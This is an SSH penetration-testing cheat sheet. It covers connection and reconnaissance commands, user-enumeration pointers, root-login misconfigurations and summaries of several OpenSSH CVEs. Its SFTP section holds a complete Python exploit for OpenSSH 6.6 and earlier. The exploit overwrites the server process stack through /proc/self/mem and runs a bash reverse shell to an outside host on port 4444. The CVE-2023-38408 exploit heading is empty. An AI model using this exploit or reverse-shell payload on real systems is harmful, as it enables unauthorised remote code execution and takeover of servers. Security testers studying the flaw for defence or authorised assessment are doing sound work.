# SSH Pentest

## Connection

### Basic Connection

Basic Connection

```bash
ssh username@192.0.2.1
```

Basic Connection (non-conventional port)

```bash
ssh username@192.0.2.1 -p 2222
```

Connect with Private Key

```bash
ssh -i id_rsa username@192.0.2.1
```

Connect without Interactive Password

```bash
sshpass -p password ssh username@192.0.2.1
```

Connect with Certain Public Key Type

```bash
ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa user@192.0.2.1
```

Connect with Certain Host Key Algorithms

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa user@192.0.2.1
```

### sshfs


```bash
sshfs username@191.0.2.1:/ /mnt/sshfs
```

## Reconnaissance

### Gather Server Public Keys

```bash
ssh-keyscan 192.0.2.1
```

### Generate Public Key Pairs

Interactive

```bash
ssh-keygen
```

Non-Interactive

```bash
ssh-keygen -q -b 2048 -t rsa -f /tmp/id_rsa -N ""
```

### Get Host Keys

```bash
nmap --script ssh-hostkey --script-args 192.0.2.1
```

```bash
nmap --script ssh-hostkey --script-args ssh_hostkey=full 192.0.2.1
```

### Get Supported Algorithms

```bash
nmap --script ssh2-enum-algos 192.0.2.1
```

### Get Supported Authentication Methods

```bash
nmap --script ssh-auth-methods --script-args="ssh.user=admin" 192.0.2.1
```

## User Enumeration

### Common Credentials

- [SecLists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt)
- [SecLists/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt)

### Metasploit

```console
msf > use auxiliary/scanner/ssh/ssh_enumusers
```

## Misconfiguration

Common SSH servers (e.g. OpenSSH) allow root login by default.

- OpenSSH: The directive `PermitRootLogin` determines whether root login is allowed.
- Dropbear: The `-w` flag disallows root login.

## SFTP

### OpenSSH SFTP Misconfiguration

#### Version

OpenSSH <= 6.6 

#### Description

OpenSSH grants SFTP access to users while disallowing full command execution using `ForceCommand internal-sftp`. However, if the server and don't use `ChrootDirectory`, the user will be able to **access the whole filesystem, including the procfs**. 

In procfs, `/proc/self/maps` reveals the memory layout, while `/proc/self/mem` allows writing values to arbitrary memory addressses. This results in remote code execution.

#### Exploit

```python
#!/usr/bin/env python3

# OpenSSH <= 6.6 SFTP misconfiguration exploit for 32/64bit Linux
# The original discovery by Jann Horn: http://seclists.org/fulldisclosure/2014/Oct/35
#
# Adam Simuntis :: https://twitter.com/adamsimuntis
# Mindaugas Slusnys :: https://twitter.com/mislusnys

from pwn import *
import paramiko
import sys
import time

# parameters
cmd = "bash -c 'bash -i >& /dev/tcp/198.51.100.1/4444 0>&1'"
host = '192.0.2.1'
port = 22
username = 'ftp_user'
password = 'password'

# connection
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(hostname = host, port = port, username = username, password = password)
sftp = ssh.open_sftp()

# parse /proc/self/maps to get addresses

print('[*] Analysing /proc/self/maps on remote system')

PROC_SELF_MAPS_FILE = '/tmp/maps'
sftp.get('/proc/self/maps', PROC_SELF_MAPS_FILE)
with open(PROC_SELF_MAPS_FILE, 'r') as f:
    lines = f.readlines()
    for line in lines:
        words = line.split()
        addr = words[0]
        if 'libc' in line and 'r-xp' in line:
            path = words[-1]
            addr = addr.split('-')
            BITS = 64 if len(addr[0]) > 8 else 32
            print('[+] {}bit libc mapped @ {}-{}, path: {}'.format(BITS, addr[0], addr[1], path))
            libc_base = int(addr[0], 16)
            libc_path = path
        if '[stack]' in line:
            addr = addr.split('-')
            saddr_start = int(addr[0], 16)
            saddr_end = int(addr[1], 16)
            print('[+] Stack mapped @ {}-{}'.format(addr[0], addr[1]))

# Download remote libc and extract information

print('[+] Fetching libc from remote system')

LIBC_SO_PATH = '/tmp/libc.so'
sftp.get(str(libc_path), LIBC_SO_PATH)
elf = ELF(LIBC_SO_PATH)
sys_addr = libc_base + elf.symbols['system']
exit_addr = libc_base + elf.symbols['exit']

# Gadgets for the RET slide and system()

if BITS == 64:
    pop_rdi_ret = libc_base + next(elf.search(b'\x5f\xc3'))
    ret_addr = pop_rdi_ret + 1
else:
    ret_addr = libc_base + next(elf.search(b'\xc3'))

print('[+] system()  @ {}'.format(hex(sys_addr)))
print("[+] 'ret' @ {}".format(hex(ret_addr)))
if BITS == 64:
    print("[+] 'pop rdi; ret' @ {}".format(hex(pop_rdi_ret)))

with sftp.open('/proc/self/mem','rw') as f:
    if f.writable():
        print("[+] We have r/w permissions for '/proc/self/mem'")
    else:
        print("[-] Fatal error. No r/w permission for '/proc/self/mem'.")
        sys.exit(0)

    print("[*] Patching /proc/self/mem on the remote system")

    stack_size = saddr_end - saddr_start
    new_stack = b''

    print("[+] Pushing new stack to {}. Fingers crossed.".format(hex(saddr_start)))

    if BITS == 32:
        new_stack += p32(ret_addr) * (stack_size//4)
        new_stack = cmd.encode() + b"\x00" + new_stack[len(cmd)+1:-12]
        new_stack += p32(sys_addr)
        new_stack += p32(exit_addr)
        new_stack += p32(saddr_start)
    else:
        new_stack += p64(ret_addr) * (stack_size//8)
        new_stack = cmd.encode() + b"\x00" + new_stack[len(cmd)+1:-32]
        new_stack += p64(pop_rdi_ret)
        new_stack += p64(saddr_start)
        new_stack += p64(sys_addr)
        new_stack += p64(exit_addr)

    # Debug info
    FAKE_STACK_PATH = '/tmp/fake_stack'
    with open(FAKE_STACK_PATH, 'wb') as fake_stack:
        fake_stack.write(new_stack)

    # Write command to top off the stack
    f.seek(saddr_start)
    f.write(cmd.encode() + b"\x00")

    # Write the rest from bottom up, we're going to crash at some point
    for off in range(stack_size - 32000, 0, -32000):
        cur_addr = saddr_start + off

        try:
            f.seek(cur_addr)
            f.write(new_stack[off:off+32000])
        except:
            print("Stack write failed - that's probably good!")
            print('Check if you command was executed...')
            sys.exit(0)

sftp.close()
ssh.close()
```

## CVEs

### CVE-2016-6210

> sshd in OpenSSH before 7.3, when SHA256 or SHA512 are used for user password hashing, uses BLOWFISH hashing on a static password when the username does not exist, which allows remote attackers to enumerate users by leveraging the timing difference between responses when a large password is provided.

#### Version

OpenSSH < 7.3

#### Description

When SSHD authenticates a user that does not exist, it will use a hardcoded fake password based on Blowfish. On the other hand, real users' passwords can be hashed using SHA256 or SHA512, which takes longer time if the password is large. 

Thus, the response time can be used as an oracle to determine whether a user exists. A shorter response time means that such a user does not exist, and vice versa.

### CVE-2018-15473

> OpenSSH through 7.7 is prone to a user enumeration vulnerability due to not delaying bailout for an invalid authenticating user until after the packet containing the request has been fully parsed, related to auth2-gss.c, auth2-hostbased.c, and auth2-pubkey.c.

### CVE-2023-38408

> The PKCS#11 feature in ssh-agent in OpenSSH before 9.3p2 has an insufficiently trustworthy search path, leading to remote code execution if an agent is forwarded to an attacker-controlled system. (Code in /usr/lib is not necessarily safe for loading into ssh-agent.) NOTE: this issue exists because of an incomplete fix for CVE-2016-10009.

#### Exploit


## Tools

- [sshfs](https://github.com/libfuse/sshfs) - A network filesystem client to connect to SSH servers
- [ssh-audit](https://github.com/jtesta/ssh-audit) - A tool for ssh server & client configuration auditing

